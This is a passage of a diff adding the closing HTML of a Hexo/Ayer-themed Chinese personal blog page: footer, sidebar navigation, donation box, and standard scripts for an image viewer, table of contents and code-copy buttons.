+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2017-2021
+        <i class="ri-heart-fill heart_icon"></i> GuoKer
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="http://beian.miit.gov.cn/" target="_black">桂ICP备19000641号-1</a>
+        </li>
+        
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://v1.cnzz.com/z_stat.php?id=1277959436&amp;web_id=1277959436'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Guoker&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://github.com/GuoKerS/some_script/">辣鸡脚本</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>吹吹牛吗？</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://photo.o0o0.club/wx.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+
+</html>
